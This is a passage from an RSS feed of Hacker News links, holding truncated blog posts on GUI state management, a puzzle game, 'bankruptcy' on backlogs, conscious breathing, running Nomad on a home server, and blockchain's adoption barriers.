the corners cut you. How bad could it really be?</p><p>It turns out, for small components this strategy works quite well. As usual, it‚Äôs often the wrong thing
to do when your project grows large and contains hundreds of such inter class communication paths.
Not to mention how injecting hundreds of components is tedious, error prone and ugly to look at.</p><p>In hard times like these, the developers like to reach out for one of the fancy pants
dependency injection frameworks, which supposedly allow you to clean up the
component injection mess. In reality they trade compile time safety for some
convenience and runtime crashes [1]. Now, you have two problems:</p><ol><li>You are still injecting hundreds of components.</li><li>The dependency injection framework randomly breaks and nobody knows why.</li></ol><p>The main reason why I prefer not to use dependency injection frameworks in large projects
is because they tend to make the whole project more convoluted and harder to understand.
It‚Äôs very easy to add just another component injection and not put any effort towards
refactoring the code. This leads to the proliferation of small classes or services,
because the injection framework allows you to do with no upfront investment. You pay for this
crime later on once you have hundreds of injections all over the place and nobody is able to follow
and debug this mesh of small components
(see also <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">On navigating a large codebase</a>).</p><h3 id="lift-the-state-up">Lift the state up</h3><p>A preferred way, where preferred means some kind of handwavy generalization of what
the majority of developers might do, of handling this accidental complexity is by
lifting the state up and storing the state of your component into another box that is
usually called the model. Model View Controller (MVC) gang rejoice.
This pattern allows you to separate the presentation of your data (view) from
the actual data (model), with the use of controller that connects the two together [2].</p><p>Instead of injecting hundreds of components into a god like component that controls all
its children, you put the shared state of the relevant GUI components into a god like model
that controls the state of all those children.
The end result is similar, but separating the data from the view layer might earn you some
positive reviews at the end of the year from the unit test groupies.
Even though you improved the situation a little bit, you still have a huge model that is full of
weird edge cases. The GUIs are inherently a giant state machines and they often get
into a weird state that is only discovered when you are actually running the GUI.</p><p>Maintaining a large and messy model is hard, so you decide to saw the model into smaller models
that group the state of components which conceptually fit together. At some point during this
‚Äúsaw the model‚Äù process you realize that certain things between the two different models should be kept
in sync. The more modern GUI frameworks usually arm you with some kind of data binding abstraction,
which allows to easily propagate data changes from one model to another via the so called one way,
two way data binding.</p><p>Soon enough, you realize that it would be really useful if you could attach a change listener
that would trigger and perform an action on every change of the state object.
Say we would like to change the background color of the user avatar component
every time the working light turns on. The code describing this situation might look something like:</p><div><pre><code data-lang="java"><span>this</span><span>.</span><span>lightTurnedOn</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>.</span><span>editingInventoryTable</span><span>);</span>

<span>this</span><span>.</span><span>lightTurnedOn</span><span>.</span><span>addListener</span><span>((</span><span>oldState</span><span>,</span> <span>lightTurnedOn</span><span>)</span> <span>-&gt;</span> <span>{</span>
    <span>if</span> <span>(</span><span>lightTurnedOn</span><span>)</span> <span>{</span>
        <span>changeBackgroundToRed</span><span>();</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>changeBackgroundToIbmGray</span><span>();</span>
    <span>}</span>
<span>});</span></code></pre></div><p>This is usually the point at which you start losing control of your GUI. Clicking on buttons will start
triggering events which will modify the state in the model that will in turn start triggering event
listeners causing your GUI to flash like a christmas tree. The problem of data bindings and
change listeners is that they make it really easy to introduce a hidden circular event listeners
that will trigger one another multiple times (event A changes state B and change of state B triggers event A).
Such problems are rarely discovered during development, because developers are normally
using powerful machines in comparison to the mortals that are still sticking to their ancient computers.
These problems are also rarely discovered through code reviews, as the state changes are well
hidden within one of those one line state bindings.</p><p>I still don‚Äôt know what the proper solution to this problem would be.
Keep your state manipulations as simple as possible and try not to share any
data between different models. Every time I went forward with some fancy
listener-binding mechanisms, I‚Äôve ended up causing subtle circular listener recalculations
that were extremely hard to debug.</p><h3 id="message-bus">Message bus</h3><p>Congratulations, a large amount of your effort will go towards resolving weird message bus problems
as opposed to writing the business logic of your app. In the beginning, the message bus usually sounds
like a good idea because it simplifies a lot of communication problems between the different UI components.
You can send some events through the pipe and sure enough other parts of your application will react
to them.</p><p>You might be thinking: ‚ÄúMessage bus for communicating between components in the GUI? That‚Äôs crazy!‚Äù
Well, it turns out you can have a message bus that is not a huge ram gobbling process. In fact you are probably
already using it, as the GUI frameworks usually have some sort of an event queue built in that is used
for propagating the events in the system.</p><p>As your application grows you might realize that just spamming messages back and forth causes a lot of
performance problems. In case you have hundreds of components that are generating events, your little
user avatar component might be sifting through hundreds of messages per second while it is
only interested in one. Have no fear, message bus got your back. Any message bus worth their salt
allows you to define different channels that introduce rough message type ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/">https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131178</guid>
            <pubDate>Sun, 14 Feb 2021 10:41:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Functional Programming Visually]]>
            </title>
            <description>
<![CDATA[
Score 333 | Comments 52 (<a href="https://news.ycombinator.com/item?id=26131075">thread link</a>) | @polyrand
<br/>
February 14, 2021 | https://david-peter.de/cube-composer/ | <a href="https://web.archive.org/web/*/https://david-peter.de/cube-composer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
            <p><img src="https://david-peter.de/cube-composer/img/cube-composer.svg" width="200" height="35" alt="cube composer"></p>
            <div id="panel">
                <p><b>Choose level:</b><br>
                
                <b>Goal:</b></p>
                
            </div>
            <div id="message">
                <p><span id="solved">Solved ‚úì</span></p><div><a id="nextlevel"><u>N</u>ext level</a></div>
            </div>
            <canvas id="canvas" width="1600" height="860"></canvas>
            <div id="controls">
                <div>
                    <ul id="available"></ul>
                </div>
                <div>
                    <ul id="program"></ul>
                    <div>
                        <a id="reset"><u>R</u>eset</a>
                    </div>
                </div>
            </div>
            <p>
                A game by <a href="https://david-peter.de/">David Peter</a>. Source code on <a href="https://github.com/sharkdp/cube-composer">GitHub</a>.<br>
                
            </p>
        </div></div>]]>
            </description>
            <link>https://david-peter.de/cube-composer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131075</guid>
            <pubDate>Sun, 14 Feb 2021 10:25:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declare bankruptcy and don‚Äôt be ashamed of it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26131011">thread link</a>) | @ZephyrBlu
<br/>
February 14, 2021 | https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	
	<div id="content">

	<div id="primary">
		<main id="main">

		

<article id="post-1461">
	<!-- .entry-header -->

	<div>
		
<p>I‚Äôm not talking about financial bankruptcy. I‚Äôm talking about all the other kinds of bankruptcy:</p>



<ul><li>Email bankruptcy (anything important will come back up)</li><li>Backlog bankruptcy (because <a href="https://critter.blog/2020/09/03/backlogs-are-not-idea-buckets/">Backlogs are not idea&nbsp;buckets</a>)</li><li>Books-to-read list bankruptcy (if your TBR list is 100+ books long, it‚Äôs not doing you any good)</li><li>Slack inbox bankruptcy (i.e., the first-day-back-from-vacation feeling)</li><li>Wiki bankruptcy (<a href="https://critter.blog/2020/08/10/wiki-bankruptcy/">I wrote about this one before</a>)</li><li>Social networking notification bankruptcy (this shouldn‚Äôt even be a question)</li><li>Browser tab bankruptcy (you can find stuff again when you to, but you won‚Äôt)</li><li>Garage/attic bankruptcy (don‚Äôt try to go through it, pay someone to haul it all away)</li></ul>



<p>If you feel like declaring bankruptcy is a failure, stop that. It‚Äôs not a failure. It‚Äôs a fresh start. It‚Äôs a powerful tool and we should take advantage of it. It‚Äôs a weight lifted. </p>



<p>If your washing machine breaks, you can spend hours and hours learning how to fix the stupid thing, or you can toss it and buy a new one. Buying a new one is nothing to be ashamed of. It‚Äôs practical. You‚Äôre declaring dryer bankruptcy (I know the metaphor is a stretch, shut up).</p>



<p>Sure, if you declare bankruptcy on the same thing over and over, then you should examine your patterns about that thing. Bankruptcy is a voice that says ‚Äúwhat can you do to make it unnecessary to do this again?‚Äù </p>



<p>Try it. Declare bankruptcy and <a href="https://twitter.com/mcrittenden">come tell me</a> if you don‚Äôt feel ten times better afterwards.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-1461 -->
			<!-- .post-nav-wrapper -->
		
		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->

	</div><!-- #content -->

	
	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131011</guid>
            <pubDate>Sun, 14 Feb 2021 10:05:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Just Breathe ‚Äì Conscious Breathing]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130986">thread link</a>) | @scotthtaylor
<br/>
February 14, 2021 | https://st.im/just-breathe/ | <a href="https://web.archive.org/web/*/https://st.im/just-breathe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
          <!--kg-card-begin: html-->  <!--kg-card-end: html--><p>Momentum. Anyone who has raised investment will tell you it's one of the most important elements of a fundraising journey. Once you get momentum, everything starts to come together. Investors have a sixth-sense for confidence, a helpful byproduct of momentum. They start getting FOMO. And the dynamic where they once held the power, changes. They now shuffle to sign term sheets, ask less questions, and move faster. They know the round will soon be complete, with or without them.</p><p>A few years ago I raised funding for my startup. At the start of the round, I was about to go into a meeting that, if successful, would give it momentum. I was nervous. I didn't want to choke. There were thirty employees who were counting on me. And a mission and vision that was important.</p><p>I'd lost count of how many boardrooms I'd seen over the past few days, but the important thing was, I felt good. Good enough to acknowledge the aromatic concoction of freshly ground coffee, expensive wood and leather ‚Äî something that had become the norm.</p><p>It was just me and my co-founder, the investor was running late.</p><p>"Great, more time to settle in, and get comfortable", I thought.</p><p>Powering on my laptop, connecting to my phone's hotspot, and opening Google Slides. A well practiced routine by now, almost automatic.</p><p>But this time something happened. Something terrible.</p><p>Maybe it was the coffee that morning. Or the lack of sleep. Or perhaps the subconscious acknowledgement of the mounting pile of day-to-day work that had taken a hit during the fundraise.</p><p>Whatever it was, I felt this wave consume me. Originating from centre of my stomach extending out to the very tips of fingers. It felt like electricity running through my veins. Palms sweaty, mind consumed.</p><p>"There's no way I can give the pitch like this."</p><p>Pulse elevated. Breathing shallow.</p><p>"Heart attack? Surely not?"<br>"Panic attack? More likely."</p><p>I'd experienced one before. This time it had reared its ugly head at the most inconvenient time. Unlike the meetings that had come before, ones that had put us on a path to <em>momentum</em>. There were now a few ways the next hour could pan out. With most of them not being great. I had to act quickly to have any sway over which it would be.</p><p>I could let my mind continue to race, try to power through, and give a sub-par presentation, all whilst visibly looking like I was in distress. This would risk the potential for investment. Alternatively, my co-founder could lead. But it would be strange for the CEO to not speak. Again, risking investment. Or I could try and get a handle on the panic attack. Easier said than done, as I'm sure anyone would who has ever experienced one, would agree.</p><p>"In for four" I told myself mentally, "Hold, two, three, four. And out: two, three, four".</p><p>Again.</p><p>"In for four," making sure to breathe deep from within, inhaling through my nose, "hold. Two, three, four.", "And out, two, three, four".</p><p>Sounds simple, even pathetic. But it's really not.</p><p>It had taken me years up until that point to realise the importance of the breath.</p><p>During a panic attack you will start breathing deeply, over-breathing or hyperventilating. This will cause you to accumulate extra air in your chest and diaphragm area that you don‚Äôt need. This is the reason you feel suffocated while you‚Äôre having a panic attack.</p><p>Eventually, this will cause pain because your chest is expanding beyond its limits and pushing on your rib cage.</p><p>During the fight or flight response, the body shuts off the digestive system because we don‚Äôt need it at that moment. This is why our appetite is reduced when we are anxious. The longer the food stays in the stomach the more acid will back up in your oesophagus. This can cause chest pain and a painful throat.</p><p>About 60% of panic attacks are accompanied by hyperventilation and many people suffering from anxiety over-breathe even when they think they are relaxed. The most important thing to understand about hyperventilation or over-breathing is that although we can feel as if we haven‚Äôt enough oxygen in our body, when the opposite is true.</p><p>Healthy breathing is when there is a steady balance between breathing in oxygen and breathing out carbon dioxide. You upset this balance when you hyperventilate by exhaling more than you inhale.</p><p>Everyone tends to think that breathing comes naturally and that there can‚Äôt be a wrong way of doing it.</p><p>Unfortunately, that‚Äôs not true.</p><p>There is a right way and a wrong way and it is essential that correct breathing is learned, understood and established.</p><p>An anxious body is not a relaxed body, which is why learning how to relax your body in any situation is a must. Understanding this was my 'get out of jail free' card. It's how I could start to take back control. It allowed me to stop the spiral.</p><p>At that moment the investor walked through the door. Crisis averted. This is just one example of the power of breathing, throughout my life I've come to understand and respect it more and more.</p><p>And I think you could benefit from it.</p><h3 id="understanding-breathing-is-the-key-to-self-mastery">Understanding breathing is the key to self mastery</h3><p>There is nothing more essential to our health and wellbeing than breathing. We breathe 25,000 times a day, and every breath has an impact on our anxiety levels, blood pressure, and heart rate.</p><p>There are exercises and approaches that you can use in times of need, like my example above. There are also times when breath can be used proactively, like that upon which meditation is focused. Finally there is simply the ability to breathe correctly. Something that most people have lost the ability to do. And this could severely impact both their physical and mental health.</p><h3 id="breathe-through-your-nose-not-your-mouth">Breathe through your nose, not your mouth</h3><p>I would recommend reading James Nestor's "<em>Breath - The New Science of a Lost Art</em>". It's fascinating, making you want to finish it in a few sittings.</p><p>In it he explains that nearly half of all people are chronic mouth breathers and are chronically stressed and exhausted as a result.</p><p>Breathing through your nose can lower blood pressure, help maintain a steady heart rate, and even help with memory consolidation. In contrast, mouth breathing is the single biggest predictor of teeth cavities.</p><p>Mouthbreathing also causes the body to lose 40% more water. If you sleep with your mouth open because you have sleep apnea, or a blocked nose, you'll notice yourself waking up at night constantly parched and dry.</p><p>There was a report from the Mayo Clinic which found that Chronic insomnia, long assumed to be a psychological problem, is often a breathing problem. The millions of people who have chronic insomnia disorder and who are, right now, staring out bedroom windows, or at TVs, phones, or ceilings, can't sleep because they can't breathe.</p><p>Mouthbreathing makes you dumber. A recent Japanese study showed that rats who had their nostrils obstructed and were forced to breathe through their mouths developed fewer brain cells and took twice as long to make their way through a maze than nasal-breathing controls.</p><p>Another Japanese study in humans from 2013 found that mouthbreahing delivered a disturbance of oxygen to the prefrontal cortex, the area of the brain associated with ADHD. Nasal breathing had no such effects.</p><p>The ancient Chinese were onto it as well. "The breath inhaled through the mouth is called 'Ni Ch'i, adverse breath,' which is extremely harmful," states a passage from the Tao. "Be careful not to have the breath inhaled through the mouth."</p><p>Inhaling through your nose can trigger different body hormones than if you breathe using your mouth.</p><h3 id="anxiety-and-shallow-breathing-are-interlinked">Anxiety and shallow breathing are interlinked</h3><p>People with panic or obsessive-compulsive disorders constantly have low carbon dioxide levels and a much greater fear of holding their breath. To avoid another attack, they breathe far too much and eventually become hyper-sensitised to carbon dioxide and panic if they sense a rise in this gas. They are anxious because they‚Äôre over-breathing. Over-breathing because they‚Äôre anxious.</p><h3 id="symmetrical-inhales-and-exhales-produces-maximum-benefit">Symmetrical inhales and exhales produces maximum benefit</h3><p>The optimum amount of air we should take in at rest per minute is 5.5 litres. The optimum breathing rate is about 5.5 breaths per minute. That‚Äôs 5.5-second inhales and 5.5-second exhales. This is the perfect breath.</p><h3 id="exhaling-slowly-can-help-you-relax">Exhaling slowly can help you relax</h3><blockquote>‚ÄúBut what was even more stunning was what breathing like this did to the subjects. Whenever they followed this slow breathing pattern, blood flow to the brain increased and the systems in the body entered a state of coherence, when the functions of heart, circulation, and nervous system are coordinated to peak efficiency. The moment the subjects returned to spontaneous breathing or talking, their hearts would beat a little more erratically, and the integration of these systems would slowly fall apart. A few more slow and relaxed breaths, and it would return again.‚Äù</blockquote><p>If you measure your heart when inhaling, you will find your heart speeds up. Then, as you exhale, your heart rate will slow down. Exhaling is a parasympathetic response that is essential for conserving energy. Parasympathetic responses slow down the body‚Äôs automatic response systems. As you inhale, your diaphragm lowers and pulls blood into the thoracic cavity. As you exhale, the blood flows back through the body and calms your mental state. As I mentioned before we tend to breathe quickly when we are anxious or stressed. When we breathe quickly, our lungs are only absorbing approximately one-quarter of the oxygen from our breaths. Then, the rest of the oxygen (and carbon dioxide) is exhaled.</p><h3 id="breathe-less-to-live-longer">Breathe less to live longer</h3><p>The longest living animals have the lowest heart rates. Crucially, this low heart rate is associated with a lower respiration rate. Hence, the animals that breathe the least are living the longest. All across the animal kingdom, breathing and life span are in proportion. Elephants are some of the longest living animals and they only take four to five breaths per minute. Similarly, alligators only take one breath per minute. In comparison, dogs, cats, and mice take many more ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://st.im/just-breathe/">https://st.im/just-breathe/</a></em></p>]]>
            </description>
            <link>https://st.im/just-breathe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130986</guid>
            <pubDate>Sun, 14 Feb 2021 10:00:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Nomad for Home Server]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130946">thread link</a>) | @mr-karan
<br/>
February 14, 2021 | https://mrkaran.dev/posts/home-server-nomad/ | <a href="https://web.archive.org/web/*/https://mrkaran.dev/posts/home-server-nomad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<section>
    
    <article>
        <p>It's been a long time since I've written a post on Hydra (my home server). I use Hydra as a testbed to learn new tools, workflows and it just gives me joy to self-host applications while learning something in return.</p>
<h2 id="history">History</h2>
<p>A brief history of how <a href="https://github.com/mr-karan/hydra">Hydra's</a> setup evolved over time:</p>
<p><a href="https://mrkaran.dev/posts/home-server-setup/">2019</a>: </p>
<ul>
<li>A pretty minimal K3s setup deployed on 2 RPi4 nodes. I couldn't continue with this setup because:
<ul>
<li>Some of the apps didn't have ARM-based image (this was 2019, pre M1 hype era).</li>
<li>Didn't want to risk deploying persistent workloads on RPi.</li>
<li>A lot of tooling to deploy workloads was missing (storing env variables for eg.).</li>
<li>It was so boring to write YAML (that I also did at work). Didn't give me joy.</li>
</ul>
</li>
</ul>
<p><a href="https://mrkaran.dev/posts/home-server-updates/">2020 First Half</a>:</p>
<ul>
<li>RPi 2x Nodes + K3s + DO Droplet. Tailscale for networking.
<ul>
<li>This was a considerable step up from the previous setup. I deployed a DO node and added <a href="https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/">Node Labels</a> to deploy persistent workloads on DO Node only.</li>
<li>I used my own tooling <a href="https://github.com/mr-karan/kubekutr/">Kubekutr</a> + Kustomize which helped with version control of my configs.</li>
<li>Took quite a bit of time to onboard new services. Got lazy, didn't host much apart from initial 3-4 applications.</li>
<li>Writing long YAMLs. No joy.</li>
</ul>
</li>
</ul>
<p>2020 Second Half:</p>
<ul>
<li>Single node on DO. Terraform for deploying Docker containers.
<ul>
<li>I believe the third iteration nailed it for me. I kept the setup super simple, used Terraform for deploying workloads as Docker containers.</li>
<li>Used Terraform extensively for setting up the node, Cloudflare records, DO firewall rules.</li>
<li>Time to onboard new services reduced from a couple of hours to a few minutes. This was a huge win for me. I deployed around 10-15 new services to try it out on the server directly.</li>
<li>Writing HCL is actually a much better experience than YAML.</li>
</ul>
</li>
</ul>
<h2 id="why-nomad">Why Nomad</h2>
<p><img src="https://mrkaran.dev/images/nomad-hydra.png" alt="image"></p>
<p>Around a month back, <a href="https://nadh.in/">Kailash</a> had asked about feedback on <a href="https://www.nomadproject.io/">Nomad</a>. We at <a href="https://zerodha.com/">Zerodha</a> (India's largest stock broker) are evaluating it to migrate our services to Nomad from Kubernetes (more on this later). It was almost 2 years since I last saw Nomad so it was definitely worth re-evaluating (esp since it hit 1.0 recently). I wanted to try out Nomad to answer a personal curiosity: <em>What does it do differently than Kubernetes?</em> No better way than actually getting hands dirty, right?!</p>
<p>After following the brief tutorials from the <a href="https://learn.hashicorp.com/nomad">official website</a> I felt confident to try it for actual workloads. In my previous setup, I was hosting quite a few applications (Pihole, Gitea, Grafana etc) and thought it'll be a nice way to learn how Nomad works by deploying the same services in the Nomad cluster. And I came in with zero expectations, I already had a nice setup which was reliable and running for me. My experience with a local Nomad cluster was joyful, I was able to quickly go from 0-&gt;1 in less than 30 minutes. This BTW is a strong sign of how easy Nomad is to get started with as compared to K8s. The sheer amount of different concepts you've to register in your mind before you can even deploy a single container in a K8s cluster is bizarre. Nomad takes the easy way out here and simplified the concepts for developers into just three things:</p>
<pre><code><span>job
  \_ group
        \_ task
</span></code></pre>
<ul>
<li>Job: Job is a collection of different groups. Job is where the constraints for type of scheduler, update strategies and ACL is placed. </li>
<li>Group: Group is a collection of different tasks. A group is always executed on the same Nomad client node. You'll want to use Groups for use-cases like a logging sidecar, reverse proxies etc.</li>
<li>Task: Atomic unit of work. A task in Nomad can be running a container/binary/Java VM etc, defining the mount points, env variables, ports to be exposed etc.</li>
</ul>
<p>If you're coming from K8s you can think of Task as a Pod and Group as a Replicaset. There's no equivalent to Job in K8s. BUT! The coolest part? You don't have to familiarise yourself with all different types of Replicasets (Deployments, Daemonsets, Statefulsets) and different ways of configuring them.</p>
<p>Want to make a normal job as a periodic job in Nomad? Simply add the following block to your existing Job:</p>
<pre><code><span>periodic {
  cron = "@daily"
}
</span></code></pre>
<p>You want to make a service run as a batch job (on all Nomad nodes -- the equivalent of Daemonset in K8s)? Simply make the following change to your existing job:</p>
<pre><code><span>-type="service"
</span><span>+type="batch"
</span></code></pre>
<p>You see <strong>this</strong> is what I mean by the focus on UX. There are many many such examples which will leave a nice smile on your face if you're coming from K8s background.</p>
<p>I'd recommend reading <a href="https://www.nomadproject.io/docs/internals/architecture">Internal Architecture</a> of Nomad if you want to understand this in-depth.</p>
<h2 id="architecture">Architecture</h2>
<p>Tech stack for Hydra:</p>
<ul>
<li>Tailscale VPN: Serves as a mesh layer between my laptop/mobile and DO server. Useful for exposing internal services.</li>
<li>Caddy for reverse proxying and automatic SSL setup for all services. I run 2 instances of Caddy:
<ul>
<li>Internal: Listens on Tailscale Network Interface. Reverse proxies all private services.</li>
<li>Public: Listens on DO's Public IPv4 network interface. Reverse proxies all public-facing services.</li>
</ul>
</li>
<li>Terraform: Primary component to have IaC (Infra as Code). Modules to manage:
<ul>
<li>Cloudflare DNS Zone and Records</li>
<li>DO Droplet, Firewall rules, SSH Keys, Floating IPs etc.</li>
<li>Nomad Jobs. Used for running workloads after templating env variables, config files in Nomad job files.</li>
</ul>
</li>
</ul>
<h2 id="complexity-of-nomad-vs-kubernetes">Complexity of Nomad vs Kubernetes</h2>
<p><a href="https://twitter.com/mrkaran_/status/1268762357355823104"><img src="https://mrkaran.dev/images/k8s-meme.jpeg" alt="image"></a></p>
<p>Nomad shines because it follows the UNIX philosophy of "Make each program do one thing well". To put simply, Nomad is <em>just</em> a workload orchestrator. It only is concerned about things like Bin Packing, scheduling decisions.</p>
<p>If you're running heterogeneous workloads, running a server (or a set of servers) quickly becomes expensive. Hence orchestrators tend to make sense in this context. They tend to save costs by making it efficient to run a vast variety of workloads. This is all an orchestrator has to do really. </p>
<p>Nomad doesn't interfere in your DNS setup, Service Discovery, secrets management mechanisms and pretty much anything else. If you read some of the posts at <a href="https://k8s.af/">Kubernetes Failure Stories</a>, the most common reason for outages is Networking (DNS, ndots etc). A lot of marketing around K8s never talks about these things.</p>
<p>I always maintain "Day 0 is easy, Day N is the real test of your skills". Anyone can deploy a workload to a K8s cluster, it's always the Day N operations which involve debugging networking drops, mysterious container restarts, proper resource allocations and other such complex issues that require real skills <strong>and</strong> effort. It's not as easy as <code>kubectl apply -f</code> and my primary gripe is with people who miss out on this in their "marketing" pitches (obvious!).</p>
<h2 id="when-to-use-nomad">When to use Nomad</h2>
<p>Nomad hits the sweet spot of being operationally easy and functional. Nomad is a great choice if you want to:</p>
<ul>
<li>Run not just containers but other forms of workloads.</li>
<li>Increase developer productivity by making it easier to deploy/onboard new services.</li>
<li>Consistent experience of deployment by testing the deployments locally.</li>
<li>(Not joking) You are tired of running Helm charts or writing large YAML manifests. The config syntax for Nomad jobs is human friendly and easy to grasp.</li>
</ul>
<p>Nomad is available as a single binary. If you want to try it locally, all you need is <code>sudo nomad agent -dev</code> and you'll have a Nomad Server, Client running in dev mode along with a UI. This makes it easy for the developers to test out the deployments locally because there's very little configuration difference between this and production deployment. Not to forget it's super easy to self-host Nomad clusters. I'm yet to meet anyone who self hosts K8s clusters in production without a dedicated team babysitting it always.</p>
<p>Once you eliminate the "blackbox" components from your stack, life becomes easier for everyone.</p>
<h2 id="when-to-not-use-nomad">When to not use Nomad</h2>
<ul>
<li>If you're relying on custom controllers and operators. <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/operator/">Operator Pattern</a> is a new way of managing large complex distributed systems (like databases, job queues etc). There are a lot of community built operators which help in reducing the effort to run these services. However, all of these are tied deeply into the "Kubernetes" ecosystem. If you find yourself running any of such operators, it'll be tough (not impossible) to translate the same in Nomad ecosystem.</li>
</ul>
<p>I <em>genuinely</em> cannot think of any other reason to not use Nomad!</p>
<h2 id="practical-scenarios">Practical Scenarios</h2>
<p>Since I migrated a couple of workloads from my DO docker containers setup to Nomad, I'd demonstrate a few use cases which might be helpful if you want to start migrating your services to Nomad</p>
<h3 id="accessing-a-web-service-with-reverse-proxy">Accessing a Web service with Reverse Proxy</h3>
<p>Context: I'm running Caddy as a reverse proxy for all the services. Since we discussed earlier, Nomad <strong>only</strong> is concerned about scheduling, so how exactly do you do Service Discovery? You need Consul (or something like Consul, Nomad has no hard restrictions) to register a service name with it's IP Address. Here's how you can do that:</p>
<p>In the <code>.task</code> section of your Nomad job spec, you need to register the service name with the port you're registering and additional tags as metadata (optional):</p>
<pre><code><span>service {
  name = "gitea-web"
  tags = ["gitea", "web"]
  port = "http"
}
</span></code></pre>
<p>Nomad's <a href="https://www.nomadproject.io/docs/job-specification/template">template</a> uses <code>consul-template</code> behind the scenes. This is a small utility which continuously watches for Consul/Vault keys and provides the ability to reload/restart your workloads if any of those keys change. It can also be used to <em>discover</em> the address of the service registered in Consul. So here's an example of <code>Caddyfile</code> using Consul Template functions to pull the IP address of the upstream <code>gitea-web</code> service:</p>
<pre><code><span>git.mrkaran.dev {
    {{ range service "gitea-web" }}
    reverse_proxy {{ .Address }}:{{ .Port }}
    {{ end }}
}
</span></code></pre>
<p>When a job is submitted to Nomad, a rendered template is mounted inside the container. You can define actions on what to do when the values change. For eg on a redeployment of Gitea container, the address will most likely change. We'd like Caddy to automatically restart with the new address configured in the Caddyfile in that case:</p>
<pre><code><span>template {
  data = &lt;&lt;EOF
${caddyfile_public}
EOF

  destination = "configs/Caddyfile" # Rendered template.

  change_mode = "restart"
}
</span></code></pre>
<p>Using <a href="https://www.nomadproject.io/docs/job-specification/template#change_mode"><code>change_m‚Ä¶</code></a></p></article></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mrkaran.dev/posts/home-server-nomad/">https://mrkaran.dev/posts/home-server-nomad/</a></em></p>]]>
            </description>
            <link>https://mrkaran.dev/posts/home-server-nomad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130946</guid>
            <pubDate>Sun, 14 Feb 2021 09:53:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why blockchain is not yet working (2018)]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 288 (<a href="https://news.ycombinator.com/item?id=26130912">thread link</a>) | @max_
<br/>
February 14, 2021 | https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/ | <a href="https://web.archive.org/web/*/https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2 id="the-current-state">The current state</h2>
<p>There is a lot of hype about what the global distributed ledger aka ‚ÄúBlockchain‚Äù can do for society.
A ‚Äútrust machine‚Äù as some people call it, that will bring the power of finance, data sovereignty and inclusion to the people,
hence rendering centralized intermediaries like Visa, Barclays &amp; Facebook obsolete.</p>
<p>We shall achieve this by using a combination of robust, battle tested cryptography &amp; game theory.</p>
<p>While this vision is plausible, realising it is not a easy as it may seem.</p>
<p>The blockchain is not yet ready.</p>
<h2 id="the-core-barriers-to-main-stream-adoption">The core barriers to main stream adoption</h2>
<p>The blockchain, while being a new concept in decentralized distributed databases has also presented a very unique set of problems in computer science &amp; economics that have never been solved at the time of this writing.</p>
<p>Is this post, I will talk about the the 6 most important issues only with which if solved, shall we (blockchain enthusiasts) ever achieve our vision.</p>
<h3 id="1-scalability-issues">1. Scalability Issues</h3>
<p>The current bandwidth, i.e the data that can be transmitted through a blockchain with in a given time is simply too bounded for main stream adoption.</p>
<p>Ethereum for instance does a maximum of 13 transactions per second. Visa on the other hand can do 24,000 Transaction per second and peak over 40,000 transactions per second.</p>
<p>So as you can see, the blockchain is thousands of magnitudes unable to manage a global traffic of financial transactions.
This is what they call the ‚ÄúScalability Problem‚Äù</p>
<p>Coming up with a solution to scalability the problems without tarnishing the original value propositions of a blockchain (immutability/security, decentralization &amp; censorship resistance) is not trivial. It has been nick named the <a href="https://github.com/ethereum/wiki/wiki/Sharding-FAQ#this-sounds-like-theres-some-kind-of-scalability-trilemma-at-play-what-is-this-trilemma-and-can-we-break-through-it">‚Äúscalability trilemma‚Äù</a> by Vitalik Buterine (Ethereum‚Äôs co-author).</p>
<h3 id="2-lack-of-intuitive-private-key-management">2. Lack of Intuitive Private Key Management</h3>
<p>Ordinary users will simply never wrap their heads around private keys.</p>
<p>Private keys, which are a string of text used to sign transactions and make other proofs(cryptographic).</p>
